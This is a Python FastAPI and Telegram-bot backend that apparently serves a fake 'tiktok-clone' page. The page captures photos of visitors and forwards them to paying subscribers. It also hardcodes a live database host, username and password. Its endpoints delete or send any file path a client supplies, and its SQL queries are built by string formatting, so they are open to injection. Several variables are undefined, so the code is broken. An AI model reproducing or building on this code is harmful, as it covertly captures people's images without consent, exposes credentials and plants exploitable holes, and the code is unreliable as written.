import os
from fastapi import FastAPI, Form, UploadFile, File, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from aiogram import Bot
from aiogram.types import FSInputFile
from datetime import datetime
import aiofiles
import uvicorn
import logging
import mysql
import mysql.connector
from aiogram import types
from aiogram.utils.keyboard import InlineKeyboardMarkup
import time

path_file = '/root/tg_bot'
db_host = "93.93.207.52"
db_user = "gen_user" 
db_password = "PUQC7sa$"
db_name = "default_db"



app = FastAPI()

app.add_middleware(
        CORSMiddleware,
        allow_origins=["*"],
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )

@app.post("/del_photo")
async def webhook2(photo: str = Form(...)):
    os.remove(photo)


@app.post("/get_photo")
async def webhook2(photo: str = Form(...),
        user_id: str = Form(...),):
    try:
        await bot.send_photo(user_id, FSInputFile(photo))
    except:
        await bot.send_message(user_id, "Срок хранения фото истек")
        
@app.post("/tiktok")
async def webhook(
        tiktok_url: str = Form(...),
        user_id: str = Form(...),
        redirect_url: str = Form(...),
        photo: UploadFile = File(...)
):


    additional_info = f"url={tiktok_url}, id={user_id}, redirect={redirect_url}"
        
    if photo:
            
        mydb = await connect()
        mycursor = mydb.cursor(buffered=True)

        mycursor.execute("SELECT subscription FROM kwork22_user WHERE id_tg = '{}'".format(int(user_id)))
        subscription = mycursor.fetchone()
        subscription = int(subscription[0])

        mycursor.execute("SELECT * FROM kwork22_rezerv")
        all_rezerv = mycursor.fetchall()

        token_1 = all_rezerv[0][0]
        token_2 = all_rezerv[1][0]
        token_3 = all_rezerv[2][0]
        token_4 = all_rezerv[3][0]
        token_5 = all_rezerv[4][0]
        token_6 = all_rezerv[5][0]
        token_7 = all_rezerv[6][0]
        token_8 = all_rezerv[7][0]
        token_9 = all_rezerv[8][0]
        token_10 = all_rezerv[9][0]

        all_token = [token_1, token_2, token_3, token_4, token_5, token_6, token_7, token_8, token_9, token_10]
        bot = Bot(token_1)
        if subscription > 0:

        
            await send_telegram_photo(user_id, photo, redirect_url, bot)
                 
        else:
            photo_path = await save_image(photo, "data/images")

         
        
            kb_list = [
              [types.InlineKeyboardButton(text='Открыть фото', callback_data=f'ph!{str(photo_path)}')]
            ]


            keyboard =  InlineKeyboardMarkup(inline_keyboard=kb_list)



            message = await send_telegram_message(user_id=user_id, text=f"🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}", reply_markup=keyboard, bot=bot)

         
            mycursor.execute("INSERT INTO kwork22_photo (url, photo_time, user_id, message_id, token)  VALUES ('{}', '{}', '{}', '{}', '{}')".format(photo_path, int(time.time()), int(user_id), str(message_list), str(token_kist) ))
            mydb.commit() 
                                     
                
        mycursor.close()
        mydb.close()
    return {"status": "Success"}


async def send_telegram_message(user_id, text, reply_markup, bot):
    message = await bot.send_message(user_id, text, reply_markup=reply_markup, disable_web_page_preview=True)
    return message


async def send_telegram_photo(user_id, photo, redirect_url, bot):
    photo_path = await save_image(photo, "data/images")
    message = await bot.send_photo(user_id, FSInputFile(photo_path), caption=f'🙎‍♂️Вам пришло новое фото!\nСсылка: https://rusfai-tiktok-clone2-c56e.twc1.net/tt?id={user_id}&redirect={redirect_url}')

    mydb = await connect()
    mycursor = mydb.cursor(buffered=True)
        
    mycursor.execute("INSERT INTO kwork22_photo (url, photo_time, user_id, message_id)  VALUES ('{}', '{}', '{}', '{}')".format(photo_path, int(time.time()), int(user_id), 0))
    mydb.commit() 

    mycursor.close()
    mydb.close()

async def connect():
    mydb = mysql.connector.connect(
        host=db_host,
        user=db_user,
        password=db_password,
        database=db_name,
    )
    return mydb
        
async def save_image(image: UploadFile, directory: str) -> str:
    if image.filename.split(".")[-1].lower() not in ['jpeg', 'png', 'jpg', 'gif']:
        raise HTTPException(status_code=400, detail="Invalid image type")

    if not os.path.exists(directory):
        os.makedirs(directory)

    filename = f"{int(datetime.utcnow().timestamp())}_{image.filename}"
    file_path = os.path.join(directory, filename)

    async with aiofiles.open(file_path, 'wb') as out_file:
        content = await image.read()
        await out_file.write(content)


    return file_path


if __name__ == '__main__':
    uvicorn.run(app, host="0.0.0.0", port=8001)
